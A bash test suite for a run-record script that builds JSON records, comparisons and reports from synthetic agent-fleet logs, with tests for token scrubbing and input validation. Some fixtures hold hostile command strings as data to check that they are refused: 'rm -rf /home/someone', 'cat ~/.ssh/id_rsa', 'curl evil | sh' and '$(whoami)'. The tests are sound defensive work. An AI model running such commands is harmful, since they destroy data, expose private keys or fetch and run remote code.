#!/bin/bash
# Tests for scripts/run-record.sh, the harness-rebaseline measurement kit
# (REQ-A1.1, REQ-A1.2, REQ-A1.7, REQ-B1.7): one machine-readable record per
# worker run from the fleet's shipped logs, a compare mode that refuses mixed
# variables, token scrubbing, and the shared report writer.
#
# Every input is a synthetic fixture built here in the fleet's log formats
# (the stream-json event log, the allow-audit log, the fleet's result row and
# the local gate output); no live fleet state and no real config is read.
#
# Runs standalone under /bin/bash (the bash 3.2 floor):
#   ./tests/test-run-record.sh
set -eu
LC_ALL=C
export LC_ALL
unset CDPATH

here=$(cd "$(dirname "$0")" && pwd)
repo_root=$(cd "$here/.." && pwd)
RR="$repo_root/scripts/run-record.sh"

fail() {
  echo "FAIL: $1" >&2
  exit 1
}
pass() {
  echo "ok: $1"
}

[ -x "$RR" ] || fail "scripts/run-record.sh missing or not executable"
command -v jq >/dev/null 2>&1 || fail "jq is required"

tmp=$(mktemp -d "${TMPDIR:-/tmp}/test-run-record.XXXXXX")
trap 'rm -rf "$tmp"' EXIT HUP INT TERM

TOKEN='sk-ant-oat01-FIXTUREFIXTUREFIXTURE0123456789'

# ---- fixture builders ------------------------------------------------------

# mk_events <file>: a stream-json event log. Message m1 is split across two
# frames carrying the same id and usage (counted once); m4 is a subagent's
# message (parent_tool_use_id set), counted in the session total.
mk_events() {
  {
    printf '%s\n' '{"type":"system","subtype":"init","session_id":"s1"}'
    printf '%s\n' '{"type":"assistant","message":{"id":"m1","usage":{"input_tokens":100,"output_tokens":20,"cache_creation_input_tokens":5,"cache_read_input_tokens":50},"content":[{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"echo SECRET_COMMAND_TEXT"}}]}}'
    printf '%s\n' '{"type":"assistant","message":{"id":"m1","usage":{"input_tokens":100,"output_tokens":20,"cache_creation_input_tokens":5,"cache_read_input_tokens":50},"content":[{"type":"tool_use","id":"t2","name":"Read","input":{"file_path":"/home/someone/x"}}]}}'
    printf '%s\n' '{"type":"control_request","request_id":"r1","request":{"subtype":"can_use_tool","tool_name":"Bash"}}'
    printf '%s\n' '{"type":"control_request","request_id":"r2","request":{"subtype":"can_use_tool","tool_name":"AskUserQuestion"}}'
    printf '%s\n' '{"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"t1","is_error":false,"content":"ok"}]}}'
    printf '%s\n' '{"type":"assistant","message":{"id":"m2","usage":{"input_tokens":10,"output_tokens":2,"cache_creation_input_tokens":0,"cache_read_input_tokens":7},"content":[{"type":"tool_use","id":"t3","name":"Skill","input":{"skill":"planwright:self-review"}}]}}'
    printf '%s\n' '{"type":"assistant","message":{"id":"m3","usage":{"input_tokens":3,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"content":[{"type":"tool_use","id":"t4","name":"Agent","input":{"description":"lens: correctness","subagent_type":"general-purpose"}},{"type":"tool_use","id":"t5","name":"Agent","input":{"description":"lens: security","subagent_type":"general-purpose"}},{"type":"tool_use","id":"t6","name":"Agent","input":{"description":"explore the tree","subagent_type":"Explore"}}]}}'
    printf '%s\n' '{"type":"assistant","parent_tool_use_id":"t4","message":{"id":"m4","usage":{"input_tokens":40,"output_tokens":8,"cache_creation_input_tokens":1,"cache_read_input_tokens":2},"content":[{"type":"tool_use","id":"t7","name":"Grep","input":{"pattern":"x"}}]}}'
    printf '%s\n' '{"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"t7","is_error":true,"content":"Permission to use Bash has been denied."}]}}'
    printf '%s\n' '{"type":"result","subtype":"success","is_error":false,"duration_ms":90000,"session_id":"s1"}'
  } >"$1"
}

mk_audit() {
  {
    echo "time=2026-11-03T10:00:00Z session=s1 arm=read-only cmd_sha256=$(printf 'a%.0s' $(seq 1 64))"
    echo "time=2026-11-03T10:00:01Z session=s1 arm=own-branch cmd_sha256=$(printf 'b%.0s' $(seq 1 64))"
    echo "time=2026-11-03T10:00:02Z session=s1 arm=read-only cmd_sha256=$(printf 'c%.0s' $(seq 1 64))"
  } >"$1"
}

mk_gate() {
  printf '%s\n' 'ok: something' 'GATE_EXIT=0' >"$1"
}

mk_result() {
  printf 'result\tsuccess\t1700000000\tfalse\n' >"$1"
}

# mk_identity <file> <arm> [model_map] [kb_hash]
mk_identity() {
  {
    echo "planwright_commit=0123456789abcdef0123456789abcdef01234567"
    echo "plugin_build=0.75.2"
    echo "claude_cli_version=2.1.218"
    echo "model_map=${3:-worker=opus-5.5,helper=sonnet-5.5}"
    echo "worker_brief_variant=baseline-no-quick-wins"
    echo "permission_arm=$2"
    echo "known_bad_set_hash=${4:-kbh1}"
    echo "candidate_diff_hash=none"
    echo "changed_knobs=none"
  } >"$1"
}

# mk_run <dir> <arm> [model_map] [kb_hash]: a full fixture run in <dir>.
mk_run() {
  mkdir -p "$1"
  mk_events "$1/events.jsonl"
  mk_audit "$1/audit.log"
  mk_gate "$1/gate.out"
  mk_result "$1/result"
  mk_identity "$1/identity" "$2" "${3:-}" "${4:-}"
}

# rec <dir> <out> [extra args...]
rec() {
  local d=$1 out=$2
  shift 2
  "$RR" record --events "$d/events.jsonl" --audit "$d/audit.log" \
    --gate "$d/gate.out" --result "$d/result" --identity-file "$d/identity" \
    --out "$out" "$@"
}

# ---- a1: every field from a fixture run ------------------------------------

mk_run "$tmp/r1" today
rec "$tmp/r1" "$tmp/r1.json" || fail "a1: a complete fixture run must yield a record"
jq -e . "$tmp/r1.json" >/dev/null || fail "a1: the record must be valid JSON"
chk() { # <jq-expr> <expected> <label>
  local got
  got=$(jq -r "$1" "$tmp/r1.json")
  [ "$got" = "$2" ] || fail "a1: $3: want '$2', got '$got'"
}
chk '.tool_calls' 7 "tool calls (every distinct tool_use id, subagents included)"
chk '.permission_prompts' 1 "prompts (can_use_tool, AskUserQuestion excluded)"
chk '.denials' 1 "denials"
chk '.audited_approvals' 3 "allow-audit approvals"
chk '.tokens.input' 153 "input tokens over session and subagents"
chk '.tokens.output' 31 "output tokens"
chk '.tokens.cache_creation' 6 "cache-creation tokens"
chk '.tokens.cache_read' 59 "cache-read tokens"
chk '.wall_time_seconds' 90 "wall time"
chk '.polish_rounds' 1 "polish rounds"
chk '.lens_agents' 2 "lens agents"
chk '.outcome' completed "run outcome"
chk '.gate.exit' 0 "gate exit"
chk '.gate.passed' true "gate passed"
for f in planwright_commit plugin_build claude_cli_version model_map \
  worker_brief_variant permission_arm known_bad_set_hash \
  candidate_diff_hash changed_knobs; do
  v=$(jq -r ".harness.$f // empty" "$tmp/r1.json")
  [ -n "$v" ] || fail "a1: harness.$f missing"
done
pass "a1: a fixture run yields a record with every field"

# A tool's own OS error is not a permission denial from the harness.
mk_run "$tmp/d" today
printf '%s\n' '{"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"tx","is_error":true,"content":"cat: x: Permission denied"}]}}' >>"$tmp/d/events.jsonl"
rec "$tmp/d" "$tmp/d.json" || fail "a1: record with an OS error result must be written"
[ "$(jq -r .denials "$tmp/d.json")" = 1 ] || fail "a1: an OS 'Permission denied' must not count as a denial"

# An empty event log is a missing source, never a record of zeros.
mk_run "$tmp/e" today
: >"$tmp/e/events.jsonl"
rc=0
rec "$tmp/e" "$tmp/e.json" 2>"$tmp/e.err" || rc=$?
[ "$rc" -eq 3 ] || fail "a3: an empty event log must fail as a missing source, got $rc"
[ ! -s "$tmp/e.json" ] || fail "a3: no record may be written for an empty event log"
grep -qi "events" "$tmp/e.err" || fail "a3: the error must name the events source"

# ---- a2: outcome mapping ---------------------------------------------------

o_case() { # <result row> <want>
  mk_run "$tmp/o" today
  printf '%b\n' "$1" >"$tmp/o/result"
  rec "$tmp/o" "$tmp/o.json" || fail "a2: record must be written for '$2'"
  [ "$(jq -r .outcome "$tmp/o.json")" = "$2" ] || fail "a2: '$1' must map to $2"
}
o_case 'result\tsuccess\t1700000000\ttrue\tlimited=anthropic' rate-limited
o_case 'exit\t124\t1700000000' timed-out
o_case 'exit\t1\t1700000000\ttrue\tcause=oom' crashed
o_case 'result\tsuccess\t1700000000\tfalse' completed
pass "a2: result rows map to completed, rate-limited, crashed, timed-out"

# ---- a3: a missing source is named, never zeros ----------------------------

for src in events audit gate result identity; do
  mk_run "$tmp/m" today
  case $src in
    events) rm "$tmp/m/events.jsonl" ;;
    audit) rm "$tmp/m/audit.log" ;;
    gate) rm "$tmp/m/gate.out" ;;
    result) rm "$tmp/m/result" ;;
    identity) rm "$tmp/m/identity" ;;
  esac
  rm -f "$tmp/m.json"
  rc=0
  rec "$tmp/m" "$tmp/m.json" 2>"$tmp/m.err" || rc=$?
  [ "$rc" -ne 0 ] || fail "a3: a missing $src source must fail"
  [ ! -s "$tmp/m.json" ] || fail "a3: no record may be written when $src is missing"
  grep -qi "$src" "$tmp/m.err" || fail "a3: the error must name the missing $src source"
done
# A gate output with no GATE_EXIT line is a missing gate result, not a zero.
mk_run "$tmp/m" today
printf 'no verdict here\n' >"$tmp/m/gate.out"
rc=0
rec "$tmp/m" "$tmp/m.json" 2>"$tmp/m.err" || rc=$?
[ "$rc" -ne 0 ] || fail "a3: a gate output with no GATE_EXIT must fail"
grep -qi "gate" "$tmp/m.err" || fail "a3: a gate output with no GATE_EXIT must be named missing"
pass "a3: a missing source log is named, nothing is written"

# ---- a4: a token value never reaches a record ------------------------------

mk_run "$tmp/t" today
sed "s|^changed_knobs=none|changed_knobs=leak-$TOKEN|" "$tmp/t/identity" >"$tmp/t/identity.new"
mv "$tmp/t/identity.new" "$tmp/t/identity"
# The token also rides in the events (a tool input); counting must not copy it.
printf '%s\n' "{\"type\":\"assistant\",\"message\":{\"id\":\"m9\",\"usage\":{\"input_tokens\":1,\"output_tokens\":1},\"content\":[{\"type\":\"tool_use\",\"id\":\"t9\",\"name\":\"Bash\",\"input\":{\"command\":\"echo $TOKEN\"}}]}}" >>"$tmp/t/events.jsonl"
FIXTURE_TOKEN=$TOKEN rec "$tmp/t" "$tmp/t.json" --token-env FIXTURE_TOKEN || fail "a4: record with a token in the environment must still be written"
if grep -qF "$TOKEN" "$tmp/t.json"; then fail "a4: the token value reached the record"; fi
if grep -qF "SECRET_COMMAND_TEXT" "$tmp/t.json"; then fail "a4: recorded command text reached the record"; fi
# Without naming the variable, the shipped token shape is still scrubbed.
rec "$tmp/t" "$tmp/t2.json" || fail "a4: record without --token-env must be written"
if grep -qF "$TOKEN" "$tmp/t2.json"; then fail "a4: a token-shaped value reached the record"; fi
pass "a4: a token value never reaches a record"

# ---- a5: identity values are plain tokens ----------------------------------

mk_run "$tmp/i" today
sed 's|^changed_knobs=none|changed_knobs=rm -rf /home/someone|' "$tmp/i/identity" >"$tmp/i/identity.new"
mv "$tmp/i/identity.new" "$tmp/i/identity"
rc=0
rec "$tmp/i" "$tmp/i.json" 2>"$tmp/i.err" || rc=$?
[ "$rc" -ne 0 ] || fail "a5: an identity value carrying a command or path must be refused"
grep -q "changed_knobs" "$tmp/i.err" || fail "a5: the refusal must name the field"
if grep -q "rm -rf" "$tmp/i.err"; then fail "a5: the refusal must not echo the value"; fi
pass "a5: identity values with commands or paths are refused"

# ---- b1: compare -----------------------------------------------------------

mk_run "$tmp/ca" today
mk_run "$tmp/cb" hook
rec "$tmp/ca" "$tmp/ca.json"
rec "$tmp/cb" "$tmp/cb.json"
"$RR" compare "$tmp/ca.json" "$tmp/cb.json" --variable permission_arm >"$tmp/c.out" \
  || fail "b1: records differing only in the permission arm must compare"

mk_run "$tmp/cc" hook "worker=opus-5.5,helper=haiku-5.5"
rec "$tmp/cc" "$tmp/cc.json"
rc=0
"$RR" compare "$tmp/ca.json" "$tmp/cc.json" --variable permission_arm 2>"$tmp/c.err" || rc=$?
[ "$rc" -ne 0 ] || fail "b1: a pair differing in arm and model must be refused"
grep -q "permission_arm" "$tmp/c.err" || fail "b1: the refusal must name the arm"
grep -q "model_map" "$tmp/c.err" || fail "b1: the refusal must name the model map"

mk_run "$tmp/cd" today "" kbh2
rec "$tmp/cd" "$tmp/cd.json"
rc=0
"$RR" compare "$tmp/ca.json" "$tmp/cd.json" --variable permission_arm 2>"$tmp/c.err" || rc=$?
[ "$rc" -ne 0 ] || fail "b1: a pair with different known-bad hashes must be refused"
grep -q "known_bad_set_hash" "$tmp/c.err" || fail "b1: the refusal must name the known-bad hash"
# Even when the known-bad hash is the named variable it is still refused.
rc=0
"$RR" compare "$tmp/ca.json" "$tmp/cd.json" --variable known_bad_set_hash 2>"$tmp/c.err" || rc=$?
[ "$rc" -ne 0 ] || fail "b1: a known-bad hash difference is never a comparable variable"
rc=0
"$RR" compare "$tmp/ca.json" "$tmp/cb.json" 2>"$tmp/c.err" || rc=$?
[ "$rc" -eq 2 ] || fail "b1: compare without --variable is a usage error, got $rc"
pass "b1: compare refuses mixed variables and mismatched known-bad hashes"

# ---- c1: the shared report writer ------------------------------------------

"$RR" report --title "Fixture report" --note "arm today against hook" \
  "$tmp/ca.json" "$tmp/cb.json" >"$tmp/rep.md" || fail "c1: a report from fixture records must be written"
[ -s "$tmp/rep.md" ] || fail "c1: the report is empty"
grep -q "Fixture report" "$tmp/rep.md" || fail "c1: the title is missing"
grep -q "permission_arm\|hook" "$tmp/rep.md" || fail "c1: the arms are missing"
for bad in 'SECRET_COMMAND_TEXT' '/home/' '/Users/' "$TOKEN" 'sk-ant-'; do
  if grep -qF "$bad" "$tmp/rep.md"; then fail "c1: the report holds '$bad'"; fi
done
rc=0
"$RR" report --title T --note "ran cat /home/someone/.ssh/id_rsa" "$tmp/ca.json" >"$tmp/rep2.md" 2>"$tmp/rep2.err" || rc=$?
[ "$rc" -ne 0 ] || fail "c1: a note carrying a home path must be refused"
[ ! -s "$tmp/rep2.md" ] || fail "c1: nothing may be written for a refused note"
rc=0
"$RR" report --title T --note "token $TOKEN" "$tmp/ca.json" >"$tmp/rep3.md" 2>"$tmp/rep3.err" || rc=$?
[ "$rc" -ne 0 ] || fail "c1: a note carrying a token must be refused"
rc=0
"$RR" report --title T --note "run \$(whoami) now" "$tmp/ca.json" >"$tmp/rep4.md" 2>"$tmp/rep4.err" || rc=$?
[ "$rc" -ne 0 ] || fail "c1: a note carrying command syntax must be refused"
# A glob in a note stays literal text and never expands to file names.
mkdir -p "$tmp/g"
: >"$tmp/g/zz-marker"
(cd "$tmp/g" && "$RR" report --title T --note '*' "$tmp/ca.json") >"$tmp/rep6.md" \
  || fail "c1: a report with a glob note must be written"
if grep -q "zz-marker" "$tmp/rep6.md"; then fail "c1: a glob in a note must not expand"; fi
grep -qxF '*' "$tmp/rep6.md" || fail "c1: the glob note must appear literally"
# A hand-made record with a command in an identity field is refused too.
jq '.harness.changed_knobs = "rm -rf /home/someone"' "$tmp/ca.json" >"$tmp/bad.json"
rc=0
"$RR" report --title T "$tmp/bad.json" >"$tmp/rep5.md" 2>"$tmp/rep5.err" || rc=$?
[ "$rc" -ne 0 ] || fail "c1: a record with a command in an identity field must be refused"
pass "c1: the report holds no command text, home path or token"

# ---- d1: malformed frames never abort or leak ------------------------------

mk_run "$tmp/f" today
printf '%s\n' '5' '"x"' '[]' >>"$tmp/f/events.jsonl"
printf '%s\n' '{"type":"assistant","message":{"id":"mx","usage":{"input_tokens":"cat /home/bob/.ssh/id_rsa","output_tokens":2},"content":[]}}' >>"$tmp/f/events.jsonl"
rec "$tmp/f" "$tmp/f.json" 2>"$tmp/f.err" || fail "d1: scalar frames and string usage values must not abort the record"
[ "$(jq -r '.tokens.input | type' "$tmp/f.json")" = number ] || fail "d1: a string usage value must not reach the record"
if grep -q "bob" "$tmp/f.json" "$tmp/f.err"; then fail "d1: event text leaked into the record or stderr"; fi

# ---- d2: the token variable must exist; any token shape is scrubbed ---------

mk_run "$tmp/k" today
rc=0
rec "$tmp/k" "$tmp/k.json" --token-env NO_SUCH_FIXTURE_VAR 2>"$tmp/k.err" || rc=$?
[ "$rc" -eq 2 ] || fail "d2: a --token-env naming an unset variable must be refused, got $rc"
OTHER='ya29.a0AfH6SMBfixture=tail+x'
sed "s|^changed_knobs=none|changed_knobs=$OTHER|" "$tmp/k/identity" >"$tmp/k/identity.new"
mv "$tmp/k/identity.new" "$tmp/k/identity"
FIXTURE_OTHER=$OTHER rec "$tmp/k" "$tmp/k.json" --token-env FIXTURE_OTHER || fail "d2: record with a non-sk-ant token must be written"
if grep -qF "ya29" "$tmp/k.json"; then fail "d2: a token without the sk-ant shape was not scrubbed"; fi
mk_run "$tmp/k" today
sed "s|^changed_knobs=none|changed_knobs=sk-ant-oat01-abc.def=tail|" "$tmp/k/identity" >"$tmp/k/identity.new"
mv "$tmp/k/identity.new" "$tmp/k/identity"
rec "$tmp/k" "$tmp/k.json" || fail "d2: record with a dotted sk-ant token must be written"
if grep -q "tail" "$tmp/k.json"; then fail "d2: the tail of a dotted token leaked"; fi

# ---- d3: result rows and the gate -------------------------------------------

mk_run "$tmp/x" today
printf 'exit\t0\t1700000000\ttrue\tcause=x\n' >"$tmp/x/result"
rec "$tmp/x" "$tmp/x.json" || fail "d3: record must be written"
[ "$(jq -r .outcome "$tmp/x.json")" = crashed ] || fail "d3: an exit 0 row flagged as an error must be crashed"
printf 'result\tsuccess\t1700000000\tfalse' >"$tmp/x/result"
rc=0
rec "$tmp/x" "$tmp/x.json" 2>"$tmp/x.err" || rc=$?
[ "$rc" -eq 3 ] || fail "d3: an unterminated result row is a write in flight, got $rc"
grep -qi "result" "$tmp/x.err" || fail "d3: the error must name the result source"
mk_run "$tmp/x" today
printf 'GATE_EXIT=0\nGATE_EXIT=2\n' >"$tmp/x/gate.out"
rec "$tmp/x" "$tmp/x.json" || fail "d3: record must be written"
[ "$(jq -r .gate.passed "$tmp/x.json")" = false ] || fail "d3: the last GATE_EXIT line must win"
[ "$(jq -r .gate.exit "$tmp/x.json")" = 2 ] || fail "d3: the gate exit must be 2"

# ---- d4: --out is owner-only and replaces what it finds ---------------------

: >"$tmp/o.json"
chmod 644 "$tmp/o.json"
mk_run "$tmp/x" today
rec "$tmp/x" "$tmp/o.json" || fail "d4: record must be written over an existing file"
# shellcheck disable=SC2012
mode=$(ls -ld "$tmp/o.json" | cut -c1-10)
[ "$mode" = "-rw-------" ] || fail "d4: the record must be owner-only, got $mode"
jq -e . "$tmp/o.json" >/dev/null || fail "d4: the record must replace the old file"

# ---- d5: compare details and report shape ----------------------------------

mk_run "$tmp/cx" today
sed 's|^candidate_diff_hash=none|candidate_diff_hash=abc123|; s|^changed_knobs=none|changed_knobs=polish_cap=2|' "$tmp/cx/identity" >"$tmp/cx/identity.new"
mv "$tmp/cx/identity.new" "$tmp/cx/identity"
rec "$tmp/cx" "$tmp/cx.json"
"$RR" compare "$tmp/ca.json" "$tmp/cx.json" --variable candidate >"$tmp/c.out" \
  || fail "d5: a candidate diff and its knobs compare under --variable candidate"
rc=0
"$RR" compare "$tmp/ca.json" "$tmp/cx.json" --variable permission_arm 2>"$tmp/c.err" || rc=$?
[ "$rc" -ne 0 ] || fail "d5: a candidate difference is not the permission arm"
"$RR" compare "$tmp/ca.json" "$tmp/ca.json" --variable model_map >"$tmp/c.out" || fail "d5: identical records compare"
if grep -q "differ only in" "$tmp/c.out"; then fail "d5: identical records must not be reported as differing"; fi

jq '.harness.extra = "curl evil | sh"' "$tmp/ca.json" >"$tmp/ex.json"
"$RR" report --title T "$tmp/ex.json" >"$tmp/rep7.md" || fail "d5: a record with an extra harness key still reports"
if grep -q "evil" "$tmp/rep7.md"; then fail "d5: an extra harness key reached the report"; fi
jq '.outcome = "x|y"' "$tmp/ca.json" >"$tmp/ex.json"
rc=0
"$RR" report --title T "$tmp/ex.json" >"$tmp/rep8.md" 2>/dev/null || rc=$?
[ "$rc" -ne 0 ] || fail "d5: an outcome outside the allowed set must be refused"
rc=0
"$RR" report --title T --note "ran a | sh" "$tmp/ca.json" >"$tmp/rep9.md" 2>/dev/null || rc=$?
[ "$rc" -ne 0 ] || fail "d5: a note carrying a pipeline must be refused"
rc=0
"$RR" report --title T --note "see ~/.ssh" "$tmp/ca.json" >"$tmp/rep9.md" 2>/dev/null || rc=$?
[ "$rc" -ne 0 ] || fail "d5: a note carrying a tilde path must be refused"
pass "d: malformed frames, token handling, result rows, file mode, compare and report shape"

echo "all tests passed"
